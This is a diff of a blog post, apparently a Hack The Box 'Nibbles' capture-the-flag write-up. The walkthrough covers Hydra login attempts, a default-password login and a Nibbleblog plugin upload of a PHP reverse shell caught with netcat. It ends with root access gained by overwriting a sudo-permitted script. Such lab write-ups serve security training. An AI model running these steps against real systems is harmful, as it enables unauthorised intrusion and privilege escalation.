@@ -10,6 +10,7 @@ class: post-template
 subclass: 'post'
 author: christoffer
 ---
+
 > "My writeup of the Hack the box Nibbles box... Nibble nibble!"
 
 Connecting to Hack the Box[^1] using the supplied VPN, my Nibbles box have the IP: 10.10.10.75
@@ -33,18 +34,29 @@ Seeing port 80 open, lets browse to that and look at the source code, as the bas
 <b>Hello world!</b>
 <!-- /nibbleblog/ directory. Nothing interesting here! -->
 ```
-Seeing that we have a new directory to explore, lets go to /nibbleblog/.
+Seeing that we have a new directory to explore, lets go to `/nibbleblog/`.
+ 
 ![nibblesblog-root](assets/images/posts/2018/03/nibbles-writeup/nibblesblog-root.png)
+ 
 So that points to the Content Management System (CMS) called Nibbleblog, which is opensource and free to download the sourcecode, which means we can take a look at it.
+
 A bit of googling points me to the github https://github.com/dignajar/nibbleblog
-Where the basefile "admin.php" looks interesting, and sure enough it does exist on our target.
+ 
+Where the basefile `admin.php` looks interesting, and sure enough it does exist on our target.
+ 
 ![nibblesblog-admin](assets/images/posts/2018/03/nibbles-writeup/nibblesblog-admin.png)
+ 
 The next interesting file from the github looks to be "install.php", on our target blog it is obviously already installed, nontheless it might be worth checking out!
+ 
 ![nibblesblog-install](assets/images/posts/2018/03/nibbles-writeup/nibblesblog-install.png)
-Lets follow the update link to the update page!
-![nibblesblog-update](assets/images/posts/2018/03/nibbles-writeup/nibblesblog-update.png)
+
+Lets follow the update link to the update page! 
+
+![nibblesblog-update](assets/images/posts/2018/03/nibbles-writeup/nibblesblog-update.png) 
+
 So this further reveals two files where one is quite interesting, as config files usually contains usernames even possibly passwords, and other essential config parameters!
-So lets browse to /nibbleblog/content/private/config.xml
+So lets browse to `/nibbleblog/content/private/config.xml`
+
 ```
 <config>
 [...snip...]
@@ -54,13 +66,17 @@ So lets browse to /nibbleblog/content/private/config.xml
 [...snip...]
 </config>
 ```
+
 So this time the config file does not reveal any passwords, although we're not emptyhanded as we do get a valid username "admin".
-After some further enumeration i could not find a hint towards a password or any other vulnerability to use. So i resulted in trying THC-Hydra[^2] and a small passwordlist in an attempt to run a dictionary against the login page!
+After some further enumeration I could not find a hint towards a password or any other vulnerability to use. So I resulted in trying THC-Hydra[^2] and a small passwordlist in an attempt to run a dictionary against the login page!
 Which only got me on their blacklist and blocked me a couple minutes from making further login attempts.
+ 
 ![nibblesblog-login-blacklist](assets/images/posts/2018/03/nibbles-writeup/nibblesblog-login-blacklist.png)
+ 
 Then after some further checking of the source code, i recalled it supposed to be a fairly simple box, so back to some default passwords.
 Bingo, user: Admin, Password: nibbles so a weak password indeed.
 Doing a grep for the password "nibbles" in the standard "rockyou.txt" that is included in Kali linux.
+
 ```
 root@kali:~/Wordlists$ grep 'nibbles' rockyou.txt
 nibbles
@@ -69,30 +85,41 @@ nibbles1
 ```
 We can see that doing the hydra would indeed work... eventually, you'd just have to do some timeouts between attempts.
 Either way, we have the password and is logged in to the CMS admin panel!
+ 
 ![nibblesblog-logged-in](assets/images/posts/2018/03/nibbles-writeup/nibblesblog-logged-in.png)
+ 
 Next up would be to try and get a shell on the system somehow, so back to google!
-It eventually pointed me to another security researchers blog [CureSec Nibbleblog 4.0.3 RCE](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)[^3]
-The PoC Exploit work in 4 steps
+It eventually pointed me to another security researchers blog
+
+[CureSec Nibbleblog 4.0.3 RCE](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)[^3]
+
+The PoC Exploit work in 4 steps:
 ```
 1. Obtain Admin credentials
 2. Activate My image plugin
 3. Upload PHP shell, ignore warnings
 4. Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php
 ```
+
 So since we are already logged in, we can go to step two and activate the "My Image Plugin" under Plugins in the CMS Admin Panel.
 Then lets create and upload a php reverse shell.
 My favourite php-reverse-shell is included in kali, that pentestmonkey created.
 Copy that to the working directory by issuing.
+
 ```
 root@kali:~/Nibbles$ cp /usr/share/webshells/php/php-reverse-shell.php .
 ```
+
 Then edit the $ip and $port variable in the php script, in this example i use port 4000. Once thats done, we can upload it to the CMS and start a netcat listener on our chosen port with (nc -lvvp 4000)
-In this example i used curl to trigger the RCE since the "image.php" is in a public folder.
+In this example i used curl to trigger the RCE since the `image.php` is in a public folder.
+
 ```
 root@kali:~/Nibbles$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
 ```
+
 That should kick of a basic shell created by the PHP script to the Netcat listener.
 Although the shell we recieve is a limited one, so lets enumerate which perl and python libraries are present to escape the limited shell.
+
 ```
 root@kali:~/Nibbles$ nc -lvvp 4000
 listening on [any] 4000 ...
@@ -113,9 +140,11 @@ ls /home/nibbler
 personal  personal.zip  user.txt
 nibbler@Nibbles:/$
 ```
+
 Since i am a Python guy, that's a quite an easy choice.
-Now that we have the "user.txt" flag, lets get root!
-One easy command to run is "sudo -l", which will report if the current user is in the /etc/sudoers file, as well list what commands the current user is allowed to run.
+Now that we have the `user.txt` flag, lets get root!
+One easy command to run is `sudo -l`, which will report if the current user is in the `/etc/sudoers` file, as well list what commands the current user is allowed to run.
+
 ```
 nibbler@Nibbles:/$ sudo -l
 sudo -l
@@ -128,8 +157,10 @@ User nibbler may run the following commands on Nibbles:
     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 nibbler@Nibbles:/$
 ```
-Easy enough, at a quick glance in enumeration we can see that user nibbler is allowed to run "/home/nibbler/personal/stuff/monitor.sh" as root without a password!
+
+Easy enough, at a quick glance in enumeration we can see that user nibbler is allowed to run `/home/nibbler/personal/stuff/monitor.sh` as root without a password!
 At this point getting the root flag should be fairly simple!
+
 ```
 nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "/bin/cat /root/root.txt" > monitor.sh
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
@@ -137,6 +168,7 @@ sudo: unable to resolve host Nibbles: Connection timed out
 b6d745[...snip...]8ef88c
 nibbler@Nibbles:/home/nibbler/personal/stuff$
 ```
+
 Done.
 
 [^1]: [ www.hackthebox.eu]( www.hackthebox.eu)
